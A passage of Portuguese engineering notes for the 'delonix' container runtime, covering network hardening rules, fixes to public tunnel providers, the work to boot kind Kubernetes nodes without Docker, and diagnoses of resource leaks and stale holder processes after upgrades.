`bridge-nf-call-ip6tables`, que um host pode não ter — é por isso que é a segunda e não
a única. Nada se perdeu: não há uplink v6 (o slirp corre sem `--enable-ipv6`) e o
resolvedor interno só responde registos A.

**RF-NET-02**: chain `fwguard` a `forward priority -20` (antes do `fwdeny` -10, do
`fwcont` -5 e da política 0) com `169.254.0.0/16` e `127.0.0.0/8` negados
incondicionalmente. O contador da regra provou-o ao vivo (`packets 4 bytes 240`). O
loopback do host já estava fechado pelo `--disable-host-loopback` do slirp; a regra
existe porque isso é uma flag à distância de uma regressão.

**Escapatórias ruidosas** (mesma forma do `DELONIX_FORWARD_POLICY=accept`):
`DELONIX_ENABLE_IPV6=1` e `DELONIX_ALLOW_LINK_LOCAL=1`, ambas validadas ao vivo.

**Armadilha apanhada a escrever o teste, vale reter**: a primeira versão do teste de
ordenação comparava a POSIÇÃO TEXTUAL das chains no ruleset, e depois os VALORES de
prioridade de todas elas — as duas erradas. Prioridade em nftables só ordena chains do
MESMO hook; comparar `-20` com o `-100` da chain de `nat prerouting` não quer dizer
nada. O teste só passou a valer alguma coisa quando restringiu a comparação a
`hook forward`.

**Endurecimento a QUENTE dos containers já a correr** (`infra::disable_ipv6_live`,
chamado pelo `net netns up`): a recusa entra no `attach`, o que só cobre containers
novos. Mandar reiniciar os outros seria a resposta errada NESTE motor — o dataplane não
pertence ao ciclo de vida do processo, e é essa a diferença de fundo para o docker
(`container update` já troca portas, volumes e redes com o PID inalterado). A varredura
entra nos netns vivos e desliga-lhes o v6 no lugar. Validado ao vivo contra containers
criados ANTES da correcção, com o bypass aberto: PID igual (`771209` antes e depois),
uptime a contar, v6 a zero, bypass fechado, IPv4 intacto.

**Porque é `nsenter` e não um verbo do socket de controlo** (a primeira forma tentada):
o caso que isto existe para resolver é o upgrade in-place, em que o binário novo é
instalado e o holder ANTIGO continua a correr com todos os containers agarrados a ele
(ver `stale_holder_message`). Um holder antigo não conhece um verbo acrescentado hoje —
o comando de controlo falharia exactamente no cenário que importa. Entrar-lhe nos
namespaces a partir do host funciona com qualquer binário de holder.

### `tunnel expose --provider pinggy` sem URL (v0.16.1)

Bug report real (host kaeso-sys-01): `delonix net tunnel expose --provider pinggy --local-port 8181`
respondia sempre "URL ainda não confirmada", nunca uma URL real. **Causa-raiz, confirmada
correndo o `ssh` real à mão, fora do binário**: `free.pinggy.io` (o endpoint DOCUMENTADO pela
pinggy) tem geo-DNS — a partir deste host resolvia sempre para um PoP regional partido
(`br.free.pinggy.io` → `lin.br.1.a.pinggy.click`) que aceita a ligação, aloca o `-R0`, e fecha
segundos depois sem imprimir nada. Um 2.º comportamento também reproduzido: sob `setsid`/detached
(exactamente como `spawn_and_capture` lança o processo), o `ssh` às vezes nem sai depois do
servidor fechar — fica pendurado. Nem "processo morreu" nem "processo vivo" isolam sozinhos qual
das duas falhas aconteceu. **Corrigido**: `spawn_pinggy` tenta `free.pinggy.io` primeiro (mantido
como omissão — é o documentado); se o poll não produzir URL nenhuma, mata o processo se ainda
estiver vivo (nunca deixa 2 túneis por `TunnelRecord`) e tenta uma vez `a.pinggy.io` (endpoint
próprio da pinggy, não documentado à parte, mas que ligou com sucesso nas mesmas condições).
`spawn_and_capture` também sai do poll assim que o processo morre, em vez de esperar sempre os
15s. Validado ao vivo: URL pública real devolvida (`https://….free.pinggy.net`), `curl` local E
à URL pública deram 200 — o túnel encaminha tráfego de verdade, não é só log-scraping.

### `tunnel expose` simplificado — porta posicional, `provider` opcional (BREAKING, sem alias)

Pedido do utilizador: `delonix net tunnel expose --name <n> --provider pinggy --local-port
<porta>` era o comando mais verboso deste grupo para o caso mais comum (pinggy, sem nome
próprio) — três flags para um único número que interessa. `net tunnel` não está na lista de
"Estável" do `docs/cli-stability.md`, por isso o corte é limpo, sem alias, como o precedente da
v0.30.0.

- **`local_port` passou a POSICIONAL** — `delonix net tunnel expose 8080`. A flag `--local-port`
  deixou de existir; quem a usar leva "unrecognized argument", nunca um silêncio.
- **`--provider` ganhou DEFAULT `pinggy`** (é o único que não precisa de binário extra nem de
  conta — ver o doc-comment do módulo) e passou de `String` livre a `clap::ValueEnum`
  (`TunnelProvider`), só no lado da CLI — `TunnelSpec.provider` do manifesto continua `String`,
  porque um `kind: Tunnel` não é clap e não ganha nada com o enum. Dá autocomplete de GRAÇA (o
  motor de completions dinâmicas do `clap_complete` já sabe enumerar os `possible values` de um
  `ValueEnum`, sem precisar de `ArgValueCandidates`) e `[possible values: pinggy, ngrok,
  cloudflare]` aparece sozinho no `--help`.
- **`-p`/`-n` como atalhos** de `--provider`/`--name`.
- **`--name` ganhou autocomplete dos túneis JÁ existentes** (`ArgValueCandidates::new(super::
  complete::tunnels)`, o mesmo completador que `describe`/`rm` já usavam) — útil para reexpor com
  o mesmo nome (reconfigura em vez de criar um segundo), não só para nomes novos.
- Resultado: `delonix net tunnel expose --name kitamba-saurimo-85 --provider pinggy --local-port
  8080` passa a `delonix net tunnel expose 8080 --name kitamba-saurimo-85` (ou, sem nome
  próprio, só `delonix net tunnel expose 8080`).
- Actualizados os exemplos em `manual_entries.rs`, `docs/gen.py` e `examples/tunnel.yaml` — nenhum
  ficou com a sintaxe antiga (o teste `os_exemplos_invocam_o_comando_que_documentam` só confirma
  que o exemplo NOMEIA o comando, não que a sintaxe é válida; a validação real foi ao vivo, com o
  binário, incluindo o motor de completions dinâmicas com `_CLAP_COMPLETE_INDEX`/`COMPLETE=bash`).

### `tunnel expose --token`/`--insecure-skip-tls-verify` — cloudflare NAMED tunnel, e 3 bugs achados ao vivo

Pedido directo a seguir à simplificação acima: token de conta paga (já existia para pinggy/ngrok,
mas cloudflare rejeitava-o por inteiro) + TLS. Ao contrário do resto deste módulo, este trabalho
foi validado contra binários REAIS descarregados (`cloudflared v2026.8.2`, `ngrok v3.39.11`) —
nenhum estava instalado neste host, e o `--help` real + testes ao vivo contra um servidor HTTPS
self-signed local é o que decidiu a forma final, não a documentação lida por cima.

- **`insecureSkipTlsVerify` (`TunnelSpec`/`--insecure-skip-tls-verify`)** — TLS do BACKEND LOCAL
  (self-signed em `localhost:<localPort>`), nunca da URL pública (essa é sempre um cert real do
  provider). Para `cloudflare` liga `--no-tls-verify` + troca `http://` por `https://` no `--url`;
  para `ngrok` só troca o endereço para `https://localhost:<porta>` (confirmado no `ngrok http
  --help`: `--upstream-tls-verify` existe para EXIGIR verificação, ou seja o default já é
  permissivo para um backend local — não há flag "skip" a passar); no-op documentado para
  `pinggy` (encaminha TCP cru, nunca inspecciona o que está atrás). **Validado ao vivo, as duas
  direcções**: um `cloudflared tunnel --url https://localhost:<porta>` real contra um servidor
  HTTPS self-signed devolveu 200 COM `--no-tls-verify` e 502 SEM — a flag não é decorativa.
- **`cloudflare` + `--token`/`--token-secret` corre um tunnel NOMEADO já criado**
  (`cloudflared tunnel run --token <token> --url <origem>`) — confirmado no `--help` real que
  `--token`/`--url`/`--no-tls-verify` são todos aceites por `tunnel run`, e que `--url` só faz
  efeito quando o tunnel ainda não tem ingress remoto configurado (documentado pelo próprio
  cloudflared), logo é inofensivo passá-lo sempre. **Nenhuma chamada à API do Cloudflare** — só
  corre o binário com o token que o operador já tem (dashboard/`cloudflared tunnel create`); criar
  um tunnel NOVO por API continua o follow-up documentado que já era. `hostname` passa a aceite
  (só com token) como campo INFORMATIVO — a rota em si vive no dashboard, delonix não a lê.
  **Confirmado com um token inválido**: falha em 0.4s com "Provided Tunnel token is not valid.",
  não com um crash nem um hang — prova que o argv construído é aceite pelo binário real; o caminho
  com um token VÁLIDO não foi exercitado (sem conta Cloudflare disponível neste sandbox).

**3 bugs pré-existentes encontrados ao vivo por este trabalho, todos corrigidos**, nenhum causado
pela simplificação anterior — só nunca tinham sido alcançados por um teste real antes:

1. **`provider=ngrok` estava 100% partido contra qualquer agente ngrok v3.** `spawn_ngrok` passava
   `--web-addr <porta>` para variar a API local por túnel — `ngrok http --web-addr ...` responde
   **`unknown flag`** num binário v3 real (confirmado; a API local ficou FIXA em `127.0.0.1:4040`,
   sem flag nem chave de config que a mude — `web_addr:` num `--config` YAML dá "field not found").
   Corrigido: a porta é sempre `4040` (`NGROK_WEB_ADDR`), e como só pode haver UMA, um 2.º túnel
   `ngrok` alive é recusado com razão clara (`other_alive_ngrok`) em vez de dois agentes a
   disputar a mesma porta em silêncio.
2. **`pid_alive` confundia um zombie com "vivo"** — só lia `/proc/<pid>`, e um filho morto e nunca
   `waitpid`ado continua com entrada em `/proc` (Estado `Z`) enquanto o processo QUE O CRIOU
   continuar vivo — **provado com um repro em C** antes de tocar no Rust. Isto tornava inútil a
   própria razão de existir do `!pid_alive` no poll loop do `spawn_and_capture` (fix da v0.16.1
   para o pinggy): com um token cloudflare inválido, o `cloudflared` morria em <1s e mesmo assim o
   `expose` esperava os 15s inteiros. Corrigido com um `waitpid(pid, WNOHANG)` oportunista ANTES do
   `/proc` — reaping de um filho nosso que já morreu, no-op inofensivo (ECHILD) para um pid que não
   é nosso filho (o próprio pid do processo, testado). **Revertido e confirmado que o teste novo
   falha sem o fix** (regra do repo); e confirmado ao vivo: `cloudflared crashed right at startup`
   em 0.4s em vez de um `timeout 15` a matar o processo.
3. **`poll_ngrok_api` não olhava para o pid** — mesmo com o `pid_alive` corrigido, este loop
   SEPARADO (depois do `spawn_and_capture` já ter voltado) continuava a martelar a API local os
   15s inteiros mesmo com o agente já confirmado morto. Ganhou o mesmo `if !pid_alive { break }`
   que o `spawn_and_capture` já tinha desde a v0.16.1. **Validado ao vivo**: `ngrok` sem
   `--authtoken` (falha de auth real, confirmada no log) passou de `timeout 8` a matar o processo
   para 1.4s de resposta.

**Ficheiros tocados**: só `cmd/tunnel.rs` (schema+CLI+os 3 fixes) + `pt.po` + `manual_entries.rs`
+ `docs/gen.py`/`docs/comandos/tunnel.html` (regenerados) + `docs/schema/v1/delonix.json`
(regenerado — `insecureSkipTlsVerify` é campo novo do schema publicado) + `examples/tunnel.yaml`.

## Cluster modo Kind sem Docker — investigação (GO/NO-GO)

Pedido: `delonix cluster` em modo `kind` (sem `kubeadm`) a funcionar **sem Docker instalado** —
`delonix` substituiria Docker/Podman como backend do `kind`. Antes de investir no shim de
compatibilidade Docker (grande — emulação de templates Go, `network create`, `run` com
`--publish`/`--tmpfs`/`--restart`/`--cgroupns`, `logs -f`), fez-se: (1) investigação empírica da
superfície real que o `kind` exige de um backend, (2) 2 bugs corrigidos em `delonix image pull`
que bloqueavam qualquer teste, (3) um spike de validação — a imagem `kindest/node` (systemd +
containerd aninhado) sequer arranca sob o nosso modelo de isolamento?

### Superfície capturada (referência para a fase do shim)

Investigação empírica (não suposição): `docker` real envolvido num wrapper que regista cada
invocação, com um `kind create cluster` real de ponta a ponta — **52 invocações capturadas**.
Comandos usados por um backend "docker": `info --format {{json .}}` (+ variantes `-f {{.Driver}}`,
`--format '{{json .SecurityOptions}}'`, `-f {{json .DriverStatus }}`), `ps -a --filter
label=io.x-k8s.kind.cluster=<n> --format {{.Names}}`, `inspect --type=image <ref>`, `pull <ref>`,
`network ls --filter=name=^kind$ --format={{.ID}}`, `network inspect bridge -f {{ index .Options
"com.docker.network.driver.mtu" }}`, `network create -d=bridge -o
com.docker.network.bridge.enable_ip_masquerade=true -o com.docker.network.driver.mtu=1500 --ipv6
--subnet <cidr> kind`, `run --name <n> --hostname <n> --label io.x-k8s.kind.role=... --privileged
--security-opt seccomp=unconfined --security-opt apparmor=unconfined --tmpfs /tmp --tmpfs /run
--volume /var --volume /lib/modules:/lib/modules:ro -e KIND_EXPERIMENTAL_CONTAINERD_SNAPSHOTTER
--detach --tty --label io.x-k8s.kind.cluster=<n> --net kind --restart=on-failure:1 --init=false
--cgroupns=private --publish=127.0.0.1:<porta>:6443/TCP -e KUBECONFIG=... <imagem>`, `logs -f
<n>`, `inspect --format {{ index .Config.Labels "io.x-k8s.kind.role"}} <n>`, `exec --privileged
[-i] <n> <cmd>` (repetido para `cat`/`mkdir`/`cp /dev/stdin`/`kubeadm init`/`kubectl ...`),
`inspect -f {{range .NetworkSettings.Networks}}{{.IPAddress}},{{.GlobalIPv6Address}}{{end}} <n>`,
`inspect --format {{ with (index (index .NetworkSettings.Ports "6443/tcp") 0) }}{{ printf "%s\t%s"
.HostIp .HostPort }}{{ end }} <n>`, `rm -f -v <n>`.

Templates Go usados pelo `kind` são um conjunto **finito e conhecido** (capturado acima) — a fase
do shim pode emular por **correspondência exacta das strings**, sem motor de templates Go em Rust.

### 2 bugs corrigidos em `delonix image pull` (`crates/delonix-image/src/registry.rs`)

1. **`parse_reference` não tratava `repo:tag@digest`** (formato combinado, usado pela própria
   referência `kindest/node:v1.34.0@sha256:...`) — o ramo `@` cortava a referência sem primeiro
   remover a tag do lado do `repo`, produzindo uma URL de manifesto malformada. Testes de
   regressão: `parses_repo_tag_and_digest_combined`, `parses_repo_tag_and_digest_combined_com_registo_explicito`.
2. **Timeout de 120s demasiado curto** em `registry_client`/`pull_from_registry_with_creds` —
   `kindest/node` tem layers de várias centenas de MB; o `reqwest` cortava a leitura do corpo a
   meio, reportado como `"error decoding response body"` (não é erro de parsing, é leitura
   interrompida). Subido para 600s, alinhado com `push_to_registry`/`push_oci_artifact`.

Confirmado com um smoke test real: `delonix image pull kindest/node:v1.34.0@sha256:...` completa
em ~2min (antes falhava sempre, nos dois bugs).

### Spike GO/NO-GO: `container run --privileged` — resultado: **NO-GO nesta v1**

Achado inesperado antes mesmo do spike: o motor **já tem** lógica dedicada de delegação de
cgroup2 para nodes Kind (`setup_node_cgroup_ns` em `crates/delonix-runtime/src/lib.rs`), activada
quando `--privileged` + uma label `io.x-k8s.kind.*` está presente — trabalho não documentado
antes desta sessão. Para a poder exercitar, adicionou-se uma flag `--label KEY=VAL` (repetível) a
`delonix container run` (`crates/delonix-runtime-bin/src/cmd/container.rs`) — não existia
nenhuma forma de definir labels via CLI, só internamente. Ficou como funcionalidade permanente
(expõe um campo já existente em `Container`, não é específico de Kind).

Com a label e `--privileged`, `kindest/node` **crasha sempre no mesmo ponto**, muito cedo — logo
a seguir a `INFO: detected cgroup v1` no log do próprio entrypoint da imagem (que corre num host
100% cgroup v2, confirmado via `stat -fc %T /sys/fs/cgroup` → `cgroup2fs`). O crash reproduz-se
de forma idêntica em 3 condições diferentes:

1. `--privileged` sem a label Kind (cai no caminho `--privileged` genérico).
2. `--privileged` + label Kind, sessão rootless sem delegação systemd (motor avisa: "rootless SEM
   delegação de cgroup").
3. O mesmo, mas envolto em `systemd-run --user --scope -p Delegate=yes` (delegação pedida
   explicitamente) — **não muda o resultado**.
4. Mesmo com `command` sobreposto para `sleep infinity` — não isola nada, porque `--entrypoint`
   não existe no CLI hoje: `compose_command` mantém sempre o `ENTRYPOINT` da imagem
   (`/usr/local/bin/entrypoint /sbin/init`) e só a cauda muda, então o script do `kind` corre de
   qualquer forma.

**Causa-raiz não isolada com 100% de confiança** (precisa da próxima sessão): o log mostra
"detected cgroup v1" — misdetecção, já que o host é v2-only — e o script morre logo a seguir,
silenciosamente (sem stack trace; o `Container` também não guarda exit code hoje, gap a
corrigir). Hipótese mais provável: `/sys/fs/cgroup/cgroup.controllers` não está visível/válido
de dentro do mount+userns do nosso container no momento em que o script de deteção do `kind`
corre, levando-o a um caminho de cgroup v1 legado que depois falha contra um kernel só-v2. Para
confirmar: precisa de um `--entrypoint` override no CLI para correr o entrypoint do
`kindest/node` manualmente com `set -x`, ou copiar/editar o script para instrumentação.
**Actualização (sessão -p/paridade)**: `--entrypoint` JÁ EXISTE no CLI (`cmd_run`, semântica
docker, `""` limpa), e a causa-raiz provável foi corrigida no motor (fallback bind do /sys do
host quando montar sysfs novo dá EPERM em `--privileged --net host`, + mountpoint do cgroup2
criado pós-pivot_root — ver commit `dfe7e0b`). Revalidação do boot do `kindest/node` pendente.

**RESOLVIDO — a deteção de cgroup já não é o bloqueio** (sessão -p/paridade, confirmado com
instrumentação real via `--entrypoint /bin/bash` + `set -x`). Com o fix do sysfs (`dfe7e0b`),
dentro do container `--privileged` o `/sys/fs/cgroup` é `cgroup2fs` com TODOS os controladores
(`cpuset cpu io memory hugetlb pids rdma misc dmem`, 41 entradas) — antes estava vazio. O
entrypoint do `kindest/node`, corrido sob `systemd-run --user --scope -p Delegate=yes`, imprime
agora **`INFO: detected cgroup v2`** (era "detected cgroup v1" + morte) e avança muito mais:
userns ✓, mounts shared ✓, cgroup v2 ✓, machine-id ✓, faking DMI "kind" ✓, iptables legacy.
Também se descobriu, pelo caminho, um **deadlock corrigido**: em modo console (`privileged +
detach + log_path`), se o init morre antes de enviar o master do pty e um neto reparentado
segura o socketpair, o `run` pendurava PARA SEMPRE sem log — `recv_fd` ganhou `SO_RCVTIMEO` 10s.

**RESOLVIDO — netfilter já não é o bloqueio** (loop /loop netfilter). Causa isolada: com um netns
PRÓPRIO (owned pelo userns do container, i.e. `CLONE_NEWNET` e NÃO `--net host`), `CAP_NET_ADMIN`
é efectivo e o backend **nft funciona** (`nft add table`, `iptables-nft -L/-A` todos OK). O
backend **legacy NÃO**: lê `/proc/net/ip_tables_names`, um ficheiro `0440` do root do HOST que no
nosso userns aparece com dono não-mapeado (nobody) → EPERM (o próprio host, como não-root, também
não o lê). O `select_iptables()` do entrypoint do Kind conta linhas de `iptables-legacy-save` vs
`iptables-nft-save`; num netns fresco ambos dão 0 e o empate (`legacy >= nft`) cai para legacy —
o caminho partido. **Fix (`seed_kind_nft` em `container_init`, análogo a `mask_slow_node_units`)**:
para um nó Kind (`node_cgroup`), semeia UMA regra `iptables-nft -A INPUT -j ACCEPT` (inócua, ANTES
do `execve`, ainda com CAP_NET_ADMIN) → `iptables-nft-save` reporta ≥1 linha → o Kind escolhe nft.

**ESTADO ACTUAL — o `kindest/node` ARRANCA** (`run --privileged --detach --net none` sob
`systemd-run --user --scope -p Delegate=yes`, com os dois fixes: sysfs `dfe7e0b` + `seed_kind_nft`):
`detected cgroup v2` → `setting iptables to detected mode: nft` → `starting init` → `systemd 252
running in system mode` → `Welcome to Debian GNU/Linux 12` → dezenas de `Reached target`/`Started`
→ cria a `kubelet.slice`. Container fica **Running**. O NO-GO original (systemd+cgroup do node não
arranca) está **fechado**.

**Conectividade LIGADA + netfilter validado end-to-end** (loop netfilter, 2ª iteração). Com
`--net host -p 6443:6443` (netns próprio + slirp4netns — ver `cmd_run`, `new_netns` +
`slirp_attach`) o nó Kind arranca COM rede: `tap0` `10.0.2.100/24`, resolve `registry.k8s.io`
(outbound OK), `detected cgroup v2` → `iptables mode: nft` → systemd (0 unidades falhadas) →
**containerd `active`** (socket `/run/containerd/containerd.sock`). **`kubeadm init phase preflight`
PASSA** (RC=0) sem UM ERRO de netfilter/iptables — avança até ao pull de imagens. Warnings só de:
swap, cgroup `cpuset missing` (lacuna de delegação, ver abaixo), hostname `debuerreotype`. Os
sysctls de bridge estão activos no nó (`bridge-nf-call-iptables=1`, `ip_forward=1`). **Netfilter
está resolvido de ponta a ponta** para a carga real de k8s.

**Bug corrigido pelo caminho — `exec` largava caps em containers `--privileged`**: `runtime::exec`
usava `resolve_cap_keep` incondicionalmente (default KEPT_CAPS, sem CAP_NET_ADMIN), ignorando
`container.privileged` — ao contrário do init (`spawn`, `if privileged { all_caps_mask() }`).
Depurar netfilter por dentro (`nft`/`iptables` via `delonix container exec`) dava "Operation not
permitted" apesar de o init ter as caps. Corrigido: `exec` espelha o init (caps completas + seccomp
unconfined quando privileged). Confirmado: exec CapEff `1ffffffffff`, `nft` via exec OK.

### CLUSTER KUBERNETES REAL A CORRER — `kubeadm init` COMPLETO (2026-07-17)

Um control-plane Kubernetes v1.34 **Ready** sobre o Delonix, rootless, daemonless, **sem Docker**:

```
NAME   STATUS   ROLES           AGE   VERSION            CONTAINER-RUNTIME
kadm   Ready    control-plane   8m    v1.34.0            containerd://2.1.3
etcd / kube-apiserver / kube-controller-manager / kube-scheduler / kube-proxy / kindnet  →  todos 1/1 Running
```

Provas que interessam: o **kube-proxy programa netfilter** no nosso netns rootless (`nft list tables`
→ `table ip filter`, `table ip mangle`, `table ip nat`) e o nó regista-se com `INTERNAL-IP 10.0.2.100`.

**A receita que um nó Kind rootless EXIGE** (o `delonix cluster` tem de a gerar; nada disto é bug do
runtime — é config de kubelet/kube-proxy, e é exactamente o que o `kind` rootless também faz):
1. **`featureGates: { KubeletInUserNamespace: true }`** no `/var/lib/kubelet/config.yaml`. É O passo
   decisivo. Sem ele o kubelet morre em `open /dev/kmsg` — e o próprio kubelet diz a solução no log
   ("running in UserNS, Hint: enable KubeletInUserNamespace feature flag"). Tentar dar-lhe um
   `/dev/kmsg` NÃO resolve: um bind do kmsg do host é `root:adm 0640` (uid mapeado não abre) e um
   symlink para `/dev/console` só troca ENOENT por EIO. Com a gate, o kubelet ignora o kmsg.
2. **`--fail-swap-on=false`** no kubelet: um container herda o `/proc/swaps` do HOST — o fix de swap
   da imagem VM dourada (fstab) não se aplica aqui.
3. **`conntrack: { maxPerCore: 0, min: 0 }`** no ConfigMap do kube-proxy: `nf_conntrack_max` é um
   sysctl global, não escrevível de um userns (`permission denied` → CrashLoopBackOff).
4. CNI: o `/kind/manifests/default-cni.yaml` da imagem (kindnet) aplica-se tal e qual (só substituir
   `{{ .PodSubnet }}`); o nó passa a `Ready` ~1min depois.

**Aprendido pelo caminho (leaks de recursos — ver "Produção/HA")**: o kubelet aplicou a taint
`node.kubernetes.io/disk-pressure` porque **49 rootfs órfãos** (~45 GiB) de spikes anteriores tinham
enchido o disco a 89%. Directórios de container sobrevivem a mortes abruptas sem ninguém os reapar.

**Próximas fatias (já não netfilter)**: (1) cgroup `cpuset` na delegação (preflight marca-o
"missing required" — só WARNING, mas fecha-o para um nó limpo); (2) correr `kubeadm init` completo
até um control-plane Ready (o preflight já passa; falta exercitar o pull+init+CNI reais); (3)
`--net kind` rootless (setns) para nós na MESMA rede em vez de slirp isolado por nó. O shim Docker
continua depois destes, mas a fundação — cgroup + netfilter + systemd + containerd + rede — arranca.


### RESOLVIDO — as portas publicadas morriam sozinhas: era o `delonix-engine`, não o runtime (2026-07-17)

**Fechado.** Este bug queimou várias sessões porque o diagnóstico registado aqui estava ERRADO em
ambas as premissas: dizia que "as duas metades do `publish_port` falham em SILÊNCIO" e mandava
procurar quem chamava `unpublish_port`. Não falham, e não há chamador nenhum.

**Sintoma**: porta publicada serve HTTP 200 e ~10–16s depois dá `000`, com o container `Running` e
sem `stop`/`rm`.

**O que se provou, por medição** (não por leitura de código):
1. O **DNAT fica intacto** (`nft list table ip dlxing` mostra a regra muito depois do `curl` já dar
   `000`). Só o `hostfwd` do slirp desaparece — não são "as duas metades".
2. **Nenhum código deste repo o remove**: instrumentados `unpublish_port`, `slirp_remove_hostfwd`,
   **todos** os comandos não-`list` do `slirp_api` (apanha o `remove_hostfwd` que o
   `reap_orphan_hostfwds` envia directamente) e o `control_send`. Zero ocorrências, sempre.
3. Slirp e holder **não reiniciam** (mesmo pid); o `control_loop` do holder não tem nada periódico.
4. Um hostfwd metido **à mão** pelo api-socket, sem delonix envolvido, **também** desaparece.
5. **Não é bug do slirp4netns**: um slirp de sala limpa, mesmas flags, alvo `unshare -r -n`,
   manteve o hostfwd os 33s todos.

**Causa-raiz, provada com SIGSTOP** (congelar os engines, sem matar nada):
```
engines A CORRER   → hostfwd criado a t=0,00s · DESAPARECE a t=12,01s
engines CONGELADOS → hostfwd criado a t=0,00s · PERSISTE os 30s todos
```
É o **`delonix-engine` (delonix-paas, produto PRIVADO)** a reapar portas que não são dele:
`crates/delonix-api/src/ui.rs:12937` chama `reap_orphan_hostfwds(&live)` com um `live` que só tem os
containers DELE — logo tudo o que a CLI do runtime publica é, para ele, um órfão. Agravante:
`crates/delonix-api/Cargo.toml:15` fixa `delonix-net` na **tag v0.1.0**, a versão ANTIGA do reaper
(a do fail-open: lista vazia ⇒ "nada em uso" ⇒ apaga tudo). Por isso é que remover o chamador AQUI
(`9bbbd11`) não mudou nada: a cópia que corre é a do PaaS.

**A correcção NÃO é neste repo** (regra de isolamento) — é no `delonix-paas`: o engine não pode
reapar hostfwds que não criou, e o pin de `delonix-net` tem de subir. Do lado de cá, o que faz
sentido é defesa em profundidade: **`reap_orphan_hostfwds` é código morto (zero chamadores) e é uma
armadilha para consumidores** — uma função pública que apaga estado partilhado e falha ABERTO com
lista vazia. Apagar, ou pôr a fail-closed.

**Ferramenta que ficou**: `DELONIX_TRACE_UNPUBLISH=<ficheiro|stderr>` regista quem despublica
(função, porta, pid/ppid/exe + backtrace), no `slirp_api`/`control_send`/`unpublish_port`. Custo
zero sem a env var. Foi o que permitiu ILIBAR este repo — sem isto voltava-se a suspeitar do código
errado.

**Continua em aberto**: o `refcount` do ingress vaza (16 com 3 containers vivos).

### O IPAM vaza, e o ceifador que existe não é o dele (medido 2026-08-25)

Medido no root real deste host, e cruzado — não deduzido: `ipam/10.210.json` tem **391
leases** e só **47** correspondem a um container que ainda existe (`container ps -a
--output json`). 88% não têm dono vivo. Não é uma leitura de fora que engana, como o
`_data` `chmod 700`: o ficheiro é nosso, é JSON, e as chaves são ids de container.

**Onde se perde**, seguido caminho a caminho:

- `ipam::release` tem **dois chamadores em toda a árvore**, os dois dentro do
  `infra::detach_container`/`detach_extra_container` (`infra.rs:5170` e `5180`).
- O `container rm` só chama o detach `if let Some(ip) = &c.ip` — um registo sem IP não
  liberta nada.
- O backstop para quem morre e nunca é `rm`'d é o `reap_orphan_refs` do `system prune`,
  e **ele remove o MARCADOR DE REFERÊNCIA, não o lease**: lido inteiro, toca em
  `refs_dir()` e em mais nada. O comentário do `cmd_rm` chama-lhe «the backstop for
  containers that die and are never `rm`'d at all» — e é, para o refcount. Para o IPAM
  não há ceifador nenhum: `grep ipam::` fora do próprio módulo dá allocate/reserve/lookup
  /release e zero varreduras.

**A classe é a já catalogada, com um nome novo**: *o ceifador de uma coisa não é o
ceifador da outra*. As duas vivem no mesmo `<root>/ingress`, são libertadas pelo mesmo
`detach`, e por isso lêem-se como uma só — mas só uma tem quem a limpe quando o caminho
normal não corre.

**Porque é que NÃO se escreveu já o ceifador** (e a ordem importa): reclamar um lease que
afinal está em uso entrega o mesmo IP a dois containers. O critério «não há container com
este id» é quase certo e não é prova — um container a ser criado tem lease antes de ter
registo, que é precisamente o que o `REF_MARKER_GRACE` do `reap_orphan_refs` existe para
respeitar. Um ceifador de IPAM precisa do mesmo período de graça, do mesmo `FileLock`, e
de um cenário de caos que o exercite contra um attach concorrente — o precedente é o
`volumes rm` da v0.37.0, e o contra-exemplo é o `reap_orphan_hostfwds`, que falhava ABERTO
com lista vazia e matou portas publicadas de um motor sem relação nenhuma.

Enquanto não existir, o tecto é largo (um `/16` dá 65 mil endereços por rede) e o sintoma
é invisível — mas é monótono, e hoje não há um único comando que o mostre. O
`network ipam ls` (só leitura) é o passo que vem antes de qualquer ceifa.

Ver [docs/RELATORIO-PRE-PRODUCAO.md](docs/RELATORIO-PRE-PRODUCAO.md) para a bateria E2E completa
(139 PASS / 1 FAIL) e a lista de gaps.

### Holder sobrevivente a um upgrade in-place (v0.34.2) — a armadilha do `status()` por pidfile

Bug report real (host kaeso-sys-01): `cluster create --name dev` falhava em `✗ Preparing nodes (1)`
com **``system call `control socket` failed: No such file or directory (os error 2)``** e nada mais.
O motor estava bom; o ESTADO DO HOST não: o holder a correr tinha sido arrancado por um binário
**anterior à v0.34.1**, e essa versão mudou o socket de `<DELONIX_ROOT>/ingress/control.sock` para
`/tmp/delonix-net-<uid>/control.sock` (commit `a112754`, ver `runtime_dir`) — um `install.sh` em
cima deixa o holder ANTIGO vivo, ligado a um caminho que o binário novo nunca consulta.

**A armadilha a reter**: `status()` decide "up" lendo **pidfiles**, nunca por alcançabilidade —
logo `ensure_up()` saía cedo satisfeito e o fast-fail do `control_query` (que só pergunta se o
`holder_pid` existe) deixava passar, gastando os 50×40ms de retry num caminho que nunca ia
aparecer. Cada metade era razoável; juntas transformavam "o teu holder é da build anterior" num
erro sem sujeito, sem caminho e sem recuperação. **`holder_pid.is_some()` não é "o holder é
alcançável"** — mesma família do `container.userns` que não é "está num userns diferente do meu"
(ver "Reconfiguração a quente" acima).

**Corrigido** com `stale_holder_message` (pura, testada) chamada nos DOIS sítios que a condição
alcança — `ensure_up()` (com ~2s de graça para a corrida legítima de arranque) e `control_query()`
depois de esgotar os retries (os caminhos de teardown não passam pelo `ensure_up`; e um socket que
nunca APARECEU é uma falha diferente de um que existe e recusa a ligação). Quando o socket legado
ainda está em disco, isso **prova** o upgrade in-place e a mensagem di-lo, nomeando os dois
caminhos. **Deliberadamente NÃO auto-cura**: matar um holder vivo liberta o netns e derruba a rede
de todos os containers da SDN — é decisão do operador, não de um `cluster create`. `teardown()`
(`delonix net netns down`, o comando de recuperação) passou também a limpar os caminhos legados,
para uma diagnose FUTURA não culpar um binário que já não corre. Validado ao vivo nos dois ramos
(com e sem socket legado), mais o caminho felizinho intocado (15ms, um `stat`).

### `delonix cluster load` (v0.35.0) — o `kind load docker-image`, sem registo nenhum

Pedido real: `make push` do `delonix-meet` fazia `kind load docker-image` e o binário `kind` não
existe neste host (nem serviria — precisa de um provider Docker/Podman, que este host não tem por
desenho). `delonix cluster load <IMAGEM>... [--name <cluster>]` fecha o buraco: empacota a imagem
do store LOCAL e importa-a no containerd de CADA nó a correr.

- **`delonix_image::write_oci_archive`** (`crates/delonix-image/src/save.rs`, o inverso do
  `load_docker_archive` já existente): escreve um **OCI image layout** (tar) reaproveitando o
  MESMO manifesto que `registry::build_manifest` publica num registo — os blobs do store vão
  verbatim, nada é recomprimido nem re-hashado, e os digests que o nó fica a ter são idênticos aos
  nossos. Não confundir com `image export`/`export_rootfs` (bundle de RUNTIME para runc/crun).
